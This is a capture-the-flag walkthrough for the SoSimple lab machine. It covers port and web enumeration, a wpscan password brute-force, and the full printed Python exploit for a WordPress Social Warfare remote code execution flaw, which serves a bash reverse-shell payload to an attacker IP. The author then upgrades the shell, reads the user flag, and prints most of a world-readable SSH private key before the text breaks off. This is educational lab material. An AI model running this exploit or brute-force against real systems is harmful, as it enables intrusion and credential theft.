# SoSimple

- [Machine information](#machine-information)
- [Solution](#solution)
- [References](#references)

## Machine information

```text
Type: PG Play
Difficulty: Intermediate
Community Rating: Intermediate
Meta Tags: Walkthrough, Walk-through, Write-up, Writeup
OS: Linux
Points: 20
Number of Flags: 2
Lab Description:
Engage in enumeration, web enumeration, and WordPress enumeration techniques to identify vulnerabilities. Utilize 
privilege escalation strategies and harness the abuse of sudo permissions to enhance your access. This lab is 
designed to capitalize on your skills in vulnerability exploitation.
```

Machine link: [https://portal.offsec.com/machine/sosimple-389/overview/details](https://portal.offsec.com/machine/sosimple-389/overview/details)

## Solution

### Scan for services with nmap

We start by scanning the machine on all TCP-ports with `nmap` including service info and default scripts.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ export TARGET_IP=192.168.182.78 

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ sudo nmap -sC -sV -p- $TARGET_IP            
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-08 12:49 +0100
Nmap scan report for 192.168.182.78
Host is up (0.040s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:f7:0c:df:d2:e7:79:25:61:10:f9:9b:a9:b4:88:18 (RSA)
|   256 de:92:96:68:0b:6c:a0:4f:b8:39:b2:18:af:e7:ee:76 (ECDSA)
|_  256 1b:a1:f8:9b:91:b3:02:8e:51:a0:ab:58:4d:da:73:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: So Simple
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.35 seconds
```

We have two TCP-services running:

- An [OpenSSH](https://en.wikipedia.org/wiki/OpenSSH) server version 8.2p1 on port 22
- An [Apache httpd](https://en.wikipedia.org/wiki/Apache_HTTP_Server) server 2.4.41 on port 80

We also do an UDP-scan of the top 100 ports.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ sudo nmap -sU --top-ports 100 -sV -sC $TARGET_IP
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-08 12:52 +0100
Nmap scan report for 192.168.182.78
Host is up (0.041s latency).
All 100 scanned ports on 192.168.182.78 are in ignored states.
Not shown: 58 closed udp ports (port-unreach), 42 open|filtered udp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 278.92 seconds
```

But no UDP-services were found.

### Check the web site

Browsing manually to `http://192.168.182.78/` we see this web site:

![SoSimple Homepage](Images/SoSimple_Homepage.png)

The HTML source code contains nothing interesting:

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <title>So Simple</title>
    <body style="background-color:red;">
  <img src="so-simple.png" alt="so simple" width="1900" height="790">
    </body>
</head>
```

We can also do some basic web enumeration with `nmap`.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ nmap -p 80 --script "http-* and discovery" $TARGET_IP 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-08 12:56 +0100
Pre-scan script results:
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
Nmap scan report for 192.168.182.78
Host is up (0.040s latency).

Bug in http-security-headers: no string output.
PORT   STATE SERVICE
80/tcp open  http
|_http-date: Sun, 08 Nov 2026 11:56:43 GMT; -1s from local time.
| http-headers: 
|   Date: Sun, 08 Nov 2026 11:56:50 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Last-Modified: Sun, 12 Jul 2020 22:35:22 GMT
|   ETag: "1ef-5aa46309346e3"
|   Accept-Ranges: bytes
|   Content-Length: 495
|   Vary: Accept-Encoding
|   Connection: close
|   Content-Type: text/html
|   
|_  (Request type: HEAD)
|_http-title: So Simple
|_http-feed: Couldn't find any feeds.
| http-comments-displayer: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.182.78
|     
|     Path: http://192.168.182.78:80/
|     Line number: 77
|     Comment: 
|_        <!--- Hi, nothing obvious here at the bottom of the source-code, just look further :) --->
|_http-referer-checker: Couldn't find any cross-domain scripts.
| http-vhosts: 
|_128 names had status 200
|_http-chrono: Request times for /; avg: 89.21ms; min: 84.87ms; max: 93.27ms
|_http-errors: Couldn't find any error pages.
| http-useragent-tester: 
|   Status for browser useragent: 200
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
| http-traceroute: 
|_  Possible reverse proxy detected.
|_http-xssed: No previously reported XSS vuln.
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
|_http-mobileversion-checker: No mobile version detected.
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; png: 1
|   Longest directory structure:
|     Depth: 0
|     Dir: /
|   Total files found (by extension):
|_    Other: 1; png: 1
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.

Nmap done: 1 IP address (1 host up) scanned in 226.13 seconds
```

The most interesting finding here is the `/wordpress/wp-login.php` Wordpress login page.

![SoSimple Login Page](Images/SoSimple_Login_Page.png)

Finally for the web enumeration we search for additional files and directories with `gobuster`.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -r -t 32 -x php,txt,html -u http://$TARGET_IP
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.182.78
[+] Method:                  GET
[+] Threads:                 32
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/.hta.html            (Status: 403) [Size: 279]
/.hta.php             (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/.hta.txt             (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htaccess.txt        (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 495]
/index.html           (Status: 200) [Size: 495]
/server-status        (Status: 403) [Size: 279]
/wordpress            (Status: 200) [Size: 13420]
Progress: 18456 / 18460 (99.98%)
===============================================================
Finished
===============================================================
```

And we find the Wordpress site again.

### Scan the Wordpress site

Next, we scan the Wordpress site with `wpscan`.

First we update the database.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ wpscan --update                                                                      
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.
```

Then we scan and do a brute-force attack on the enumerated users found.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ wpscan -P /usr/share/wordlists/rockyou.txt --url http://$TARGET_IP/wordpress/
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.182.78/wordpress/ [192.168.182.78]
[+] Started: Sun Nov  8 13:28:10 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.182.78/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.182.78/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.182.78/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.182.78/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.182.78/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 |  - http://192.168.182.78/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://192.168.182.78/wordpress/wp-content/themes/twentynineteen/
 | Last Updated: 2026-05-20T00:00:00.000Z
 | Readme: http://192.168.182.78/wordpress/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 3.3
 | Style URL: http://192.168.182.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6
 | Style Name: Twenty Nineteen
 | Style URI: https://wordpress.org/themes/twentynineteen/
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.182.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] simple-cart-solution
 | Location: http://192.168.182.78/wordpress/wp-content/plugins/simple-cart-solution/
 | Last Updated: 2022-04-17T20:50:00.000Z
 | [!] The version is out of date, the latest version is 1.0.2
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 0.2.0 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://192.168.182.78/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.182.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.182.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt

[+] social-warfare
 | Location: http://192.168.182.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2025-03-18T09:37:00.000Z
 | [!] The version is out of date, the latest version is 4.5.6
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Comment (Passive Detection)
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Comment (Passive Detection)
 |  - http://192.168.182.78/wordpress/, Match: 'Social Warfare v3.5.0'
 | Confirmed By:
 |  Query Parameter (Passive Detection)
 |   - http://192.168.182.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0
 |   - http://192.168.182.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://192.168.182.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://192.168.182.78/wordpress/wp-content/plugins/social-warfare/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <==========================================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <===========================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.182.78/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] max
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 2 user/s
[SUCCESS] - max / opensesame                                                                                                                                                             
^Cying admin / murrieta Time: 00:43:16 <                                                                                                      > (136139 / 28694744)  0.47%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: max, Password: opensesame

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                            > (136140 / 28694744)  0.47%  ETA: ??:??:??
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Nov  8 14:11:36 2026
[+] Requests Done: 136309
[+] Cached Requests: 40
[+] Data Sent: 47.839 MB
[+] Data Received: 786.465 MB
[+] Memory used: 315.461 MB
[+] Elapsed time: 00:43:25

Scan Aborted: Canceled by User
```

We find a number of outdated plugins such as [this one](https://wpscan.com/plugin/social-warfare/) and credentials (`max:opensesame`).

### Search for exploits

Searching for exploits for this plugin we find:

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ searchsploit social warfare      
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                         |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)                                                                                    | multiple/webapps/52346.py
WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                                                                                        | php/webapps/46794.py
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ searchsploit -m 52346      
  Exploit: Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/52346
     Path: /usr/share/exploitdb/exploits/multiple/webapps/52346.py
    Codes: CVE-2019-9978
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /mnt/hgfs/OffSec_PG/PG_Play/Fundamental/SoSimple/52346.py


┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ cat 52346.py 
#!/usr/bin/env python3

# Exploit Title: Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)
# Date: 25-06-2025
# Exploit Author: Huseyin Mardini (@housma)
# Original Researcher: Luka Sikic
# Original Exploit Author: hash3liZer
# Vendor Homepage: https://wordpress.org/plugins/social-warfare/
# Software Link: https://downloads.wordpress.org/plugin/social-warfare.3.5.2.zip
# Version: <= 3.5.2
# CVE: CVE-2019-9978
# Tested On: WordPress 5.1.1 with Social Warfare 3.5.2 (on Ubuntu 20.04)
# Python Version: Python 3.x
# Reference: https://www.exploit-db.com/exploits/46794
# Github (original PoC): https://github.com/hash3liZer/CVE-2019-9978

# The currently listed exploit for *CVE-2019-9978* (Exploit ID 46794<https://www.exploit-db.com/exploits/46794>) appears to no longer work as intended in many modern environments

# Usage:
#   1. Edit the config section below and replace `ATTACKER_IP` with your machine's IP.
#   2. Run the script: `python3 exploit.py`
#   3. It will:
#       - Create a PHP payload and save it as `payload.txt` (or any filename you set in PAYLOAD_FILE)
#       - Start an HTTP server on `HTTP_PORT` to host the payload
#       - Start a Netcat listener on `LISTEN_PORT`
#       - Trigger the vulnerability via the vulnerable `swp_debug` parameter
#   4. On success, you get a reverse shell as `www-data`.
#
# Note:
#   - PAYLOAD_FILE defines only the name of the file to be created and served.
#   - Make sure ports 8001 and 4444 are open and not in use.

import requests
import threading
import http.server
import socketserver
import os
import subprocess
import time

# --- Config ---
TARGET_URL = "http://example.com"
ATTACKER_IP = "xxx.xxx.xx.xx"  # Change to your attack box IP
HTTP_PORT = 8000
LISTEN_PORT = 4444
PAYLOAD_FILE = "payload.txt"


def create_payload():
    """Write exact reverse shell payload using valid PHP syntax"""
    payload = f'<pre>system("bash -c \\"bash -i >& /dev/tcp/{ATTACKER_IP}/{LISTEN_PORT} 0>&1\\"")</pre>'
    with open(PAYLOAD_FILE, "w") as f:
        f.write(payload)
    print(f"[+] Payload written to {PAYLOAD_FILE}")


def start_http_server():
    """Serve payload over HTTP"""
    handler = http.server.SimpleHTTPRequestHandler
    with socketserver.TCPServer(("", HTTP_PORT), handler) as httpd:
        print(f"[+] HTTP server running at port {HTTP_PORT}")
        httpd.serve_forever()


def start_listener():
    """Start Netcat listener"""
    print(f"[+] Listening on port {LISTEN_PORT} for reverse shell...")
    subprocess.call(["nc", "-lvnp", str(LISTEN_PORT)])


def send_exploit():
    """Trigger the exploit with vulnerable parameter"""
    payload_url = f"http://{ATTACKER_IP}:{HTTP_PORT}/{PAYLOAD_FILE}"
    exploit = f"{TARGET_URL}/wp-admin/admin-post.php?swp_debug=load_options&swp_url={payload_url}"
    print(f"[+] Sending exploit: {exploit}")
    try:
        requests.get(exploit, timeout=5)
    except requests.exceptions.RequestException:
        pass


def main():
    create_payload()

    # Start web server in background
    http_thread = threading.Thread(target=start_http_server, daemon=True)
    http_thread.start()
    time.sleep(2)  # Give server time to start

    # Start listener in background
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.start()
    time.sleep(1)

    # Send the malicious request
    send_exploit()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[-] Interrupted by user.")    
```

The configuration in the exploit is then updated.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ vi 52346.py              

┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ grep Config -A 5 52346.py
# --- Config ---
TARGET_URL = "http://192.168.182.78/wordpress"
ATTACKER_IP = "192.168.45.203"  # Change to your attack box IP
HTTP_PORT = 80
LISTEN_PORT = 12345
PAYLOAD_FILE = "payload.txt"
```

### Get a reverse shell

Now we can launch the exploit and get a reverse shell.

```bash
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ ./52346.py               
[+] Payload written to payload.txt
[+] HTTP server running at port 80
[+] Listening on port 12345 for reverse shell...
listening on [any] 12345 ...
[+] Sending exploit: http://192.168.182.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.203:80/payload.txt
192.168.182.78 - - [08/Nov/2026 13:55:16] "GET /payload.txt?swp_debug=get_user_options HTTP/1.0" 200 -
connect to [192.168.45.203] from (UNKNOWN) [192.168.182.78] 47334
bash: cannot set terminal process group (789): Inappropriate ioctl for device
bash: no job control in this shell
<osimple1-240-132:/var/www/html/wordpress/wp-admin$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
<osimple1-240-132:/var/www/html/wordpress/wp-admin$ 
```

### Fix/upgrade the reverse shell

Currently we don't have a proper shell so let's [fix that](https://cajac.gitbook.io/ctf-notes/lat-mov#upgrade-shell-to-tty-shell) before we continue.

```bash
<osimple1-240-132:/var/www/html/wordpress/wp-admin$ tty
tty
not a tty
<osimple1-240-132:/var/www/html/wordpress/wp-admin$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<min$ python3 -c 'import pty;pty.spawn("/bin/bash")'
<osimple1-240-132:/var/www/html/wordpress/wp-admin$ ^Z
zsh: suspended  ./52346.py
                                                                                                                                                                                         
┌──(kali㉿kali)-[/mnt/…/OffSec_PG/PG_Play/Fundamental/SoSimple]
└─$ stty raw -echo ; fg ; reset 
[1]  + continued  ./52346.py

<osimple1-240-132:/var/www/html/wordpress/wp-admin$ export SHELL=/bin/bash
<html/wordpress/wp-admin$ export TERM=xterm-256color                                                                                
stty rows 200 columns 20020-sosimple1-240-132:/var/www/html/wordpress/wp-admin$  
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/var/www/html/wordpress/wp-admin$ ^C
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/var/www/html/wordpress/wp-admin$ tty
/dev/pts/0
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/var/www/html/wordpress/wp-admin$ 
```

Nice, now we have a proper shell that survives `Ctrl + C`!

### Get the user flag

Now we can start looking for the user flag.

```bash
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/var/www/html/wordpress/wp-admin$ find / -name local.txt -type f 2>/dev/null
/home/max/local.txt
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/var/www/html/wordpress/wp-admin$ cat /home/max/local.txt
c<REDACTED>f
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/var/www/html/wordpress/wp-admin$ 
```

Excellent!

### Enumeration for privesc

Time to enumerate the system for privilege escalation opportunities.

First we check the contents in max's home directory:

```bash
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/var/www/html/wordpress/wp-admin$ cd /home/max/
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/home/max$ ls -la
total 52
drwxr-xr-x 7 max  max  4096 Aug 22  2020 .
drwxr-xr-x 5 root root 4096 Nov  8 11:48 ..
lrwxrwxrwx 1 max  max     9 Aug 22  2020 .bash_history -> /dev/null
-rw-r--r-- 1 max  max   220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 max  max  3810 Jul 12  2020 .bashrc
drwx------ 2 max  max  4096 Jul 12  2020 .cache
drwx------ 3 max  max  4096 Jul 12  2020 .gnupg
drwxrwxr-x 3 max  max  4096 Jul 12  2020 .local
-rw-r--r-- 1 max  max   807 Feb 25  2020 .profile
drwxr-xr-x 2 max  max  4096 Jul 14  2020 .ssh
-rw-r--r-- 1 max  max    33 Nov  8 11:48 local.txt
-rw-r--r-- 1 max  max    49 Jul 12  2020 personal.txt
drwxrwxr-x 3 max  max  4096 Jul 12  2020 this
-rwxr-x--- 1 max  max    43 Aug 22  2020 user.txt
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/home/max$ cd .ssh
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/home/max/.ssh$ ls -la
total 20
drwxr-xr-x 2 max  max  4096 Jul 14  2020 .
drwxr-xr-x 7 max  max  4096 Aug 22  2020 ..
-rw-r--r-- 1 max  max   568 Jul 14  2020 authorized_keys
-rwxr-xr-x 1 root root 2602 Jul 14  2020 id_rsa
-rw-r--r-- 1 root root  568 Jul 14  2020 id_rsa.pub
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/home/max/.ssh$ 
```

Ah, we have a world readable SSH private key.

Let's copy-paste it to our Kali machine.

```bash
www-data@lab-pg-20-ubuntu20-sosimple1-240-132:/home/max/.ssh$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAx231yVBZBsJXe/VOtPEjNCQXoK+p5HsA74EJR7QoI+bsuarBd4Cd
mnckYREKpbjS4LLmN7awDGa8rbAuYq8JcXPdOOZ4bjMknONbcfc+u/6OHwcvu6mhiW/zdS
DKJxxH+OhVhblmgqHnY4U19ZfyL3/sIpvpQ1SVhwBHDkWPO4AJpwhoL4J8AbqtS526LBdL
KhhC+tThhG5d7PfUZMzMqyvWQ+L53aXRL1MaFYNcahgzzk0xt2CJsCWDkAlacuxtXoQHp9
SrMYTW6P+CMEoyQ3wkVRRF7oN7x4mBD8zdSM1wc3UilRN1sep20AdE9PE3KHsImrcMGXI3
D1ajf9C3exrIMSycv9Xo6xiHlzKUoVcrFadoHnyLI4UgWeM23YDTP1Z05KIJrovIzUtjuN
pHSQIL0SxEF/hOudjJLxXxDDv/ExXDEXZgK5J2d24RwZg9kYuafDFhRLYXpFYekBr0D7z/
qE5QtjS14+6JgQS9he3ZIZHucayi2B5IQoKGsgGzAAAFiMF1atXBdWrVAAAAB3NzaC1yc2
EAAAGBAMdt9clQWQbCV3v1TrTxIzQkF6CvqeR7AO+BCUe0KCPm7LmqwXeAnZp3JGERCqW4
0uCy5je2sAxmvK2wLmKvCXFz3TjmeG4zJJzjW3H3Prv+jh8HL7upoYlv83UgyiccR/joVY
W5ZoKh52OFNfWX8i9/7CKb6UNUlYcARw5FjzuACacIaC+CfAG6rUuduiwXSyoYQvrU4YRu
Xez31GTMzKsr1kPi+d2l0S9TGhWDXGoYM85NMbdgibAlg5AJWnLsbV6EB6fUqzGE1uj/gj
BKMkN8JFUURe6De8eJgQ/M3UjNcHN1IpUTdbHqdtAHRPTxNyh7CJq3DBlyNw9Wo3/Qt3sa
yDEsnL/V6OsYh5cylKFXKxWnaB58iyOFIFnjNt2A0z9WdOSiCa6LyM1LY7jaR0kCC9EsRB
f4TrnYyS8V8Qw7/xMVwxF2YCuSdnduEcGYPZGLmnwxYUS2F6RWHpAa9A+8/6hOULY0tePu
iYEEvYXt2SGR7nGsotgeSEKChrIBswAAAAMBAAEAAAGBAJ6Z/JaVp7eQZzLV7DpKa8zTx1
arXVmv2RagcFjuFd43kJw4CJSZXL2zcuMfQnB5hHveyugUCf5S1krrinhA7CmmE5Fk+PHr
Cnsa9Wa1Utb/otdaR8PfK/C5b8z+vsZL35E8dIdc4wGQ8QxcrIUcyiasfYcop2I8qo4q0l
evSjHvqb2FGhZul2BordktHxphjA12Lg59rrw7acdDcU6Y8UxQGJ70q/JyJOKWHHBvf9eA
V/MBwUAtLlNAAllSlvQ+wXKunTBxwHDZ3ia3a5TCAFNhS3p0WnWcbvVBgnNgkGp/Z/Kvob
Jcdi1nKfi0w0/oFzpQA9a8gCPw9abUnAYKaKCFlW4h1Ke21F0qAeBnaGuyVjL+Qedp6kPF
zORHt816j+9lMfqDsJjpsR1a0kqtWJX8O6fZfgFLxSGPlB9I6hc/kPOBD+PVTmhIsa4+CN
f6D3m4Z15YJ9TEodSIuY47OiCRXqRItQkUMGGsdTf4c8snpor6fPbzkEPoolrj+Ua1wQAA
AMBxfIybC03A0M9v1jFZSCysk5CcJwR7s3yq/0UqrzwS5lLxbXgEjE6It9QnKavJ0UEFWq
g8RMNip75Rlg+AAoTH2DX0QQXhQ5tV2j0NZeQydoV7Z3dMgwWY+vFwJT4jf1V1yvw2kuNQ
N3YS+1sxvxMWxWh28K+UtkbfaQbtyVBcrNS5UkIyiDx/OEGIq5QHGiNBvnd5gZCjdazueh
cQaj26Nmy8JCcnjiqKlJWXoleCdGZ48PdQfpNUbs5UkXTCIV8AAADBAPtx1p6+LgxGfH7n
NsJZXSWKys4XVLOFcQK/GnheAr36bAyCPk4wR+q7CrdrHwn0L22vgx2Bb9LhMsM9FzpUAk
AiXAOSwqA8FqZuGIzmYBV1YUm9TLI/b01tCrO2+prFxbbqxjq9X3gmRTu+Vyuz1mR+/Bpn
+q8Xakx9+xgFOnVxhZ1fxCFQO1FoGOdfhgyDF1IekET9zrnbs/MmpUHpA7LpvnOTMwMXxh
LaFugPsoLF3ZZcNc6pLzS2h3D5YOFyfwAAAMEAywriLVyBnLmfh5PIwbAhM/B9qMgbbCeN
pgVr82fDG6mg8FycM7iU4E6f7OvbFE8UhxaA28nLHKJqiobZgqLeb2/EsGoEg5Y5v7P8pM
uNiCzAdSu+RLC0CHf1YOoLWn3smE86CmkcBkAOjk89zIh2nPkrv++thFYTFQnAxmjNsWyP
